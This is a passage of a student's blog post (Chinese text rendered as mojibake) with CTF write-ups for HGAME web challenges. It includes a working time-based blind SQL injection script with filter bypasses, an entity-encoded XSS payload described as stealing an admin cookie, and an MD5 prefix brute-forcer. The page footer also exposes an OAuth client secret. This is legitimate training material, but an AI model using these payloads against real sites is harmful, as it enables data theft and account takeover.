<h3 id="è¿‡ç¨‹-4"><a href="#è¿‡ç¨‹-4" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>è¯´æ¥ä¸¢äººï¼Œè¿™é“é¢˜æœ€å¼€å§‹æ‰‹æ³¨äº†å¾ˆé•¿æ—¶é—´ï¼Œä¸€ç›´éƒ½æ²¡æœ‰æˆåŠŸã€‚æ— å¥ˆä¹‹ä¸‹ä½¿ç”¨äº†sqlmapï¼Œå‘ç°å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨ã€‚<br>è¿™é“é¢˜è¿‡æ»¤äº†<code>select</code>å’Œç©ºæ ¼ï¼Œä¸è¿‡ä¸æ˜¯å¤§é—®é¢˜ï¼Œ<code>select</code>å¤§å†™æˆ–åŒå†™ç»•è¿‡ã€ç©ºæ ¼ç”¨<code>/**/</code>ç»•è¿‡ã€‚ä½†è®©æˆ‘è´¹è§£çš„æ˜¯<code>#</code>å’Œ<code>--+</code>è™½ç„¶æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œä½†ä¼¼ä¹å¹¶æ²¡æœ‰è¢«sqlè§£æâ€¦ä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ä¸è¿‡è¿˜æ˜¯æœ‰åŠæ³•çš„ï¼Œç”¨<code>AND/**/&#39;1</code>å³å¯ã€‚<br>é‚£ä¸å¤šè¯´äº†ï¼Œç›´æ¥ä¸Šè„šæœ¬ï¼š</p>
<pre><code>import requests

mode = input(&quot;plz input use mode:&quot;)

while(True):
    if(mode == &apos;T&apos;):
        payload = &apos;1\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/group_concat(TABLE_NAME)/**/FROM/**/information_schema.TABLES/**/WHERE/**/TABLE_SCHEMA=database()),%s,1))=%s),sleep(10),1))/**/AND/**/\&apos;1&apos;
        break

    elif(mode == &apos;C&apos;):
        tab = input(&apos;plz input tables_name:&apos;)
        payload = &apos;1\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/group_concat(COLUMN_NAME)/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME=0x&apos;+tab.encode(&apos;UTF-8&apos;).hex()+&apos;),%s,1))=%s),sleep(10),1))/**/AND/**/\&apos;1&apos;
        break

    elif(mode == &apos;F&apos;):
        tab = input(&apos;plz input tables_name:&apos;)
        col = input(&apos;plz input col_name:&apos;)
        payload = &apos;1\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/&apos;+ col +&apos;/**/FROM/**/&apos;+ tab +&apos;),%s,1))=%s),sleep(10),1))/**/AND/**/\&apos;1&apos;
        break

    elif(mode != &apos;F&apos;|&apos;C&apos;|&apos;T&apos;):
        print(&apos;Error&apos;)

url = &apos;http://139.199.182.61/index.php?id=&apos;
res = &apos;&apos;
sel_num = input(&quot;plz input sel_num:&quot;)

for i in range(1,int(sel_num)):
    print(i)
    for j in range(32,127):
        now_payload = payload % (i,j)
        now_url = url + now_payload
        try:
            r = requests.get(url=now_url,timeout=4.5)
        except:
            res += chr(j)
            print(res)
            break
print(res)

a = input(&quot;æŒ‰ä»»æ„é”®é€€å‡º&quot;)
exit()

# æŸ¥åˆ°ä¸¤ä¸ªè¡¨ï¼šf1aggggggggggggg,messages
# flagè¡¨ä¸­åªæœ‰ä¸€åˆ—ï¼šfl4444444g
# å¾—åˆ°flagï¼šhgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><p>PSï¼šè¿™ä¸ªè„šæœ¬æ˜¯æˆ‘æ ¹æ®swpuctfçš„è„šæœ¬æ”¹ç¼–çš„ï¼Œä¿®æ­£äº†ä¸Šä¸€ä¸ªè„šæœ¬çš„å°é”™è¯¯ï¼ˆé¡ºä¾¿å°å°ä¼˜åŒ–äº†ä¸€ä¸‹ä»£ç ï¼Œé¿å…æ²¡å¿…è¦çš„æ“ä½œã€‚</p>
<pre><code>hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><h2 id="Cosmosçš„æ–°è¯­è¨€"><a href="#Cosmosçš„æ–°è¯­è¨€" class="headerlink" title="Cosmosçš„æ–°è¯­è¨€"></a>Cosmosçš„æ–°è¯­è¨€</h2><h3 id="è€ƒå¯Ÿç‚¹-6"><a href="#è€ƒå¯Ÿç‚¹-6" class="headerlink" title="è€ƒå¯Ÿç‚¹"></a>è€ƒå¯Ÿç‚¹</h3><p>è„šæœ¬ç¼–å†™</p>
<h3 id="è¿‡ç¨‹-5"><a href="#è¿‡ç¨‹-5" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>è¿™é“é¢˜å°±æ˜¯å†™è„šæœ¬ï¼Œé¦–å…ˆåœ¨ä¸»é¡µä¸­å¯ä»¥çœ‹åˆ°ä¸€ä¸²å˜æ¢çš„å­—ç¬¦ä¸²ï¼Œåœ¨<code>./mycode</code>ä¸­å°±çŸ¥é“è¿™æ˜¯tokenåŠ å¯†åçš„å¯†æ–‡ã€‚åªæœ‰å½“postçš„tokenå’ŒæœåŠ¡å™¨çš„tokenå¯¹åº”å³å¯è·å¾—flagã€‚æ¯”è¾ƒå‘çš„ä¸€ç‚¹æ˜¯ï¼Œåªæœ‰æ·±å…¥å°è¯•åæ‰èƒ½çŸ¥é“è¿™é“é¢˜å˜åŒ–çš„ä¸åªæœ‰tokenï¼Œè¿˜æœ‰åŠ å¯†æ–¹å¼ã€‚<br>8è¯´äº†ï¼Œä¸Šæˆ‘è¾£é¸¡çš„pythonè„šæœ¬ï¼š</p>
<pre><code>import base64
import requests
import re
import codecs

catchPasswd = str(requests.get(&quot;http://7bf62224db.php.hgame.n3ko.co/&quot;).text)
# å¾—å¯†æ–‡
catchCrypt = str(requests.get(&quot;http://7bf62224db.php.hgame.n3ko.co/mycode&quot;).text)
# å¾—åŠ å¯†æ–¹æ³•

catchPasswd = re.sub(r&apos;(^.*\s)(.*\s)&lt;/span&gt;(.*\s)&lt;/code&gt;&lt;br&gt;.*\s&apos;, &quot;&quot;, catchPasswd)
catchPasswd = re.sub(r&apos;&lt;br&gt;(.*\s)(.*\s)(.*\s)&lt;/html&gt;&apos;, &quot;&quot;, catchPasswd)
# æ­£åˆ™æ¶ˆå»æ— ç”¨éƒ¨åˆ†

catchCrypt = re.sub(r&apos;(.*\s)(.*\s)(.*\s)echo\(&apos;, &quot;&quot;, catchCrypt)
catchCrypt = re.sub(r&apos;function(.*\s)(.*\s)(.*\s)(.*\s)(.*\s)&apos;, &quot;&quot;, catchCrypt)
catchCrypt = re.sub(r&apos;\)\)\)\)\)\)\)\)\)\)\);(.*\s).*\s}&apos;, &quot;&quot;, catchCrypt)
# ä»¤äººæ™ºç†„çš„æ­£åˆ™ï¼ˆï¼ˆï¼ˆ

crypt = catchCrypt.split(&quot;(&quot;, 10)
# ä»¥â€˜(â€™ä¸ºç•Œé™ï¼ŒæŠŠå­—ç¬¦ä¸²åˆ†å‰²

passwd = catchPasswd

def strrev(string):
    result = &apos;&apos;.join(reversed(string))
    return str(result)

def decrypt(string):
    result = &apos;&apos;
    for i in range(0,len(string)):
        result += chr(ord(string[i]) - 1)
    return str(result)

def base64_decode(string):
    result = base64.b64decode(string).decode(&apos;utf-8&apos;)
    return str(result)

def str_rot13(string):
    result = codecs.getencoder(&quot;rot-13&quot;)(string)
    return result[0]
# å„ä¸ªåŠ å¯†çš„å‡½æ•°

for i in range(0, 10):
    if(crypt[i] == &apos;strrev&apos;):
        passwd = strrev(passwd)
    elif(crypt[i] == &apos;str_rot13&apos;):
        passwd = str_rot13(passwd)
    elif(crypt[i] == &apos;base64_encode&apos;):
        passwd = base64_decode(passwd)
    elif(crypt[i] == &apos;encrypt&apos;):
        passwd = decrypt(passwd)
# è§£å¯†éƒ¨åˆ†ï¼Œå› ä¸ºå›ºå®šåŠ å¯†10æ¬¡ï¼Œæ‰€ä»¥å¾ªç¯åˆ¤æ–­10æ¬¡å³å¯

send = requests.post(&quot;http://7bf62224db.php.hgame.n3ko.co/&quot;, data={&apos;token&apos; : passwd })
print(send.text)
# æ‰“å°è¾“é€tokenåå¾—åˆ°çš„ç½‘é¡µ</code></pre><p>å¾—åˆ°flagï¼š</p>
<pre><code>hgame{5!MPLe-$criPT~WITh_pyThon~OR~PHp}</code></pre><h2 id="Cosmosçš„èŠå¤©å®¤"><a href="#Cosmosçš„èŠå¤©å®¤" class="headerlink" title="Cosmosçš„èŠå¤©å®¤"></a>Cosmosçš„èŠå¤©å®¤</h2><h3 id="è€ƒå¯Ÿç‚¹-7"><a href="#è€ƒå¯Ÿç‚¹-7" class="headerlink" title="è€ƒå¯Ÿç‚¹"></a>è€ƒå¯Ÿç‚¹</h3><p>XSS<br>md5æˆªæ–­éªŒè¯</p>
<h3 id="è¿‡ç¨‹-6"><a href="#è¿‡ç¨‹-6" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>è¿™é“é¢˜çš„è¿‡æ»¤æ–¹å¼å¾ˆæœ‰è¶£ï¼š<br>1.å¾ªç¯è¿‡æ»¤<code>&lt;&gt;</code>ä»¥åŠå…¶ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦<br>2.<code>script</code>ä¼šå˜ä¸º<code>HI THERE!</code><br>3.æ‰€æœ‰çš„å­—ç¬¦å¤§å†™<br>ä¸è¿‡å³ä½¿å¦‚æ­¤ä¹Ÿå¯ä»¥è¿›è¡ŒXSS</p>
<pre><code>&lt;img src=1 onerror=&apos;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&apos;&lt;
&lt;!- å³ï¼š&lt;img src=1 onerror=&apos;alert(1)&apos;&gt; -&gt;</code></pre><p>1.æ ¹æ®htmlä¸ä¸¥è°¨çš„è¯­æ³•è§„åˆ™ï¼Œå³ä½¿æ²¡æœ‰<code>&gt;</code>å°é—­è¯­å¥ä¹Ÿå¯ä»¥æ­£å¸¸æ˜¾ç¤º<br>PSï¼šåç«¯çš„pythonä»£ç å¥½åƒè¿˜å¸®å¿™è¡¥å…¨äº†åé¢çš„<code>&lt;</code>ï¼ˆï¼ˆï¼ˆ<br>2.ä½¿ç”¨<code>img</code>æ ‡ç­¾å’Œ<code>onerror</code>äº‹ä»¶æ¥é¿å…ä½¿ç”¨<code>script</code>å­—ç¬¦ä¸²<br>3.ä½¿ç”¨å®ä½“ç¼–ç <code>&amp;#(asciiåè¿›åˆ¶);</code>æ¥è§„é¿å­—ç¬¦çš„å¤§å†™<br>è¿™æ ·å°±å¯ä»¥ç›—å–ç®¡ç†å‘˜çš„cookieæ¥æŸ¥çœ‹flagäº†<br>è¿˜æœ‰ï¼Œå…³äºå®ä½“ç¼–ç ç½‘ä¸Šè¿˜æ²¡æœ‰å¯ä»¥ç›´æ¥ç™½å«–çš„ï¼Œè‡ªå·±æ‹¿Cçæ‰“äº†ä¸€ä¸ª<br>ï¼ˆæ„Ÿè§‰ç”¨Cæ›´ç®€å•ï¼ˆbiné€‰æ‰‹æ†‹å–·æˆ‘ï¼ˆ</p>
<pre><code>#include &lt;stdio.h&gt;

int main()
{
    char a=0;
    while(1)
    {
        scanf(&quot;%c&quot;, &amp;a);
        if(a != 0x0A)
            printf(&quot;&amp;#%d;&quot;, a);
    }
    return 0;
}</code></pre><p>å¦å¤–ï¼Œæƒ³è®©ç®¡ç†botç‚¹å‡»é¡µé¢ï¼Œè¿˜éœ€è¦å‘é€ä¸€æ®µmd5æˆªæ–­éªŒè¯<br>è¿™é‡Œç›´æ¥ç»™ç™½å«–çš„pythonè„šæœ¬ï¼ˆè¿˜æ˜¯å¤šçº¿ç¨‹çš„ï¼š</p>
<pre><code>import hashlib
from multiprocessing.dummy import Pool as ThreadPool

def md5(s): # è®¡ç®—MD5å­—ç¬¦ä¸²
    return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()

keymd5 = input(&quot;set:&quot;)
md5start = 0
md5length = 6

def findmd5(sss):
#å·²çŸ¥çš„md5æˆªæ–­å€¼ # è®¾ç½®é¢˜ç›®å·²çŸ¥çš„æˆªæ–­ä½ç½® # è¾“å…¥èŒƒå›´ é‡Œé¢ä¼šè¿›è¡Œmd5æµ‹è¯•
    key = sss.split(&apos;:&apos;)
    start = int(key[0])
    end = int(key[1])
# å¼€å§‹ä½ç½® # ç»“æŸä½ç½®
    result = 0
    for i in range(start, end): 
        if md5(i)[0:6] == keymd5:
            result = i
            print(result)
            break


list=[] # å‚æ•°åˆ—è¡¨
for i in range(10):
    pool = ThreadPool() # æ‰“å° # æ‹¿åˆ°åŠ å¯†å­—ç¬¦ä¸² # å¤šçº¿ç¨‹çš„æ•°å­—åˆ—è¡¨ å¼€å§‹ä¸ç»“å°¾
list.append(str(100000000*i) + &apos;:&apos; + str(100000000*(i+1))) # å¤šçº¿ç¨‹ä»»åŠ¡
pool.map(findmd5, list) # å‡½æ•° ä¸å‚æ•°åˆ—è¡¨
pool.close()
pool.join()</code></pre><p>å¾—åˆ°tokenï¼š<code>f802788a02a51f9c624bb5d91815b</code><br>å¾—åˆ°flagï¼š</p>
<pre><code>hgame{xsS_1s_r3a11y_inTeresT1ng!!}</code></pre></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/02/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">SQLæ³¨å…¥ç¬”è®°</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/02/24/Hello-World-0/"><span class="level-item">Hello World!!!</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.6.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.6.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: '46272616afc4bc0c5eedc7a797357c2d',
            repo: 'afkl-cuit.github.io',
            owner: 'AFKL-CUIT',
            clientID: '26712c602d4f2f684041',
            clientSecret: 'd5ee2ff38c5704ffb71006c71c585727f09bf9e7',
            admin: ["AFKL-CUIT"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: 'last',
            
            
            enableHotKey: true
        })
        gitalk.render('comment-container')</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://secure.gravatar.com/avatar/7e0f346c9d7025daf3b7ff7cf9044e4f?s=220&amp;r=X&amp;d=mm" alt="AFKL"></figure><p class="title is-size-4 is-block line-height-inherit">AFKL</p><p class="is-size-6 is-block">Student</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Chengdu CUIT</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">17</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">17</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/AFKL-CUIT" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/AFKL-CUIT"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="BiliBili" href="https://space.bilibili.com/3229657"><i class="fa fa-bold"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/feed.xml"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">Recent</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2020-11-23T13:29:35.000Z">2020-11-23</time></p><p class="title is-6"><a class="link-muted" href="/2020/11/23/javassist%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E5%AD%97%E8%8A%82%E7%A0%81/">javassistå®ç°åŠ¨æ€å­—èŠ‚ç </a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-11-22T07:18:35.000Z">2020-11-22</time></p><p class="title is-6"><a class="link-muted" href="/2020/11/22/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1/">javaååºåˆ—åŒ–--CommonsCollections1</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-11-22T06:26:11.000Z">2020-11-22</time></p><p class="title is-6"><a class="link-muted" href="/2020/11/22/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-jdk%E5%86%85%E7%BD%AE%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">javaåŠ¨æ€ä»£ç†</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-11-16T17:05:02.000Z">2020-11-17</time></p><p class="title is-6"><a class="link-muted" href="/2020/11/17/java%E6%B3%A8%E8%A7%A3%E5%AD%A6%E4%B9%A0/">javaæ³¨è§£å­¦ä¹ </a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-11-15T07:22:02.000Z">2020-11-15</time></p><p class="title is-6"><a class="link-muted" href="/2020/11/15/%E5%A6%82%E4%BD%95%E6%8C%96%E6%8E%98%E8%87%AA%E5%B7%B1%E7%9A%84php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">å¦‚ä½•æŒ–æ˜è‡ªå·±çš„phpååºåˆ—åŒ–é“¾</a></p><p class="is-uppercase"></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2020/11/"><span class="level-start"><span class="level-item">November 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/06/"><span class="level-start"><span class="level-item">June 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">April 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/debug/"><span class="tag">debug</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/docker/"><span class="tag">docker</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/javascipt/"><span class="tag">javascipt</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php/"><span class="tag">php</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssh/"><span class="tag">ssh</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BB%A3%E7%A0%81/"><span class="tag">ä»£ç </span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="tag">ä»£ç å®¡è®¡</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><span class="tag">åŸå‹é“¾æ±¡æŸ“</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">ååºåˆ—åŒ–</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%9F%BA%E7%A1%80/"><span class="tag">åŸºç¡€</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AD%97%E8%8A%82%E7%A0%81/"><span class="tag">å­—èŠ‚ç </span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AF%B9%E8%B1%A1/"><span class="tag">å¯¹è±¡</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%BC%80%E5%8F%91/"><span class="tag">å¼€å‘</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%A1%86%E6%9E%B6/"><span class="tag">æ¡†æ¶</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B3%A8%E8%A7%A3/"><span class="tag">æ³¨è§£</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BB%A7%E6%89%BF/"><span class="tag">ç»§æ‰¿</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">AFKL&#039;s Blog</a><p class="size-small"><span>&copy; 2020 AFKL</span>Â Â Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>Â &amp;Â <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">Visited by <span id="busuanzi_value_site_uv">0</span> users</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download Theme on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            site: {
                url: 'https://afkl-cuit.github.io',
                external_link: {"enable":true,"exclude":[]}
            },
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to Top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>